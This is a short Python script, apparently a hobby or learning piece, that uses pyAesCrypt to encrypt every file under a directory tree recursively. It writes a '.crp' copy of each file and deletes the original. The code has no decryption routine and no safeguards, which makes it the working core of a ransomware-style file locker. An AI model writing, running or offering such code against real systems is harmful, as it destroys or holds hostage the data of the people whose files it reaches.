import pyAesCrypt
import os

def encription(file,password):
    buffer_size = 512 * 1024

    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    print("File "+ str(os.path.splitext(file)[0]) + ' encrypted')
    os.remove(file)



#функция сканирования директорий
def walk_by_dirs(dir,password):
    for name in os.listdir(dir):
        path = os.path.join(dir,name)

        if os.path.isfile(path):
            try:
                encription(path,password)
            except Exception as ex:
                print(ex)
        else:
            walk_by_dirs(path,password)

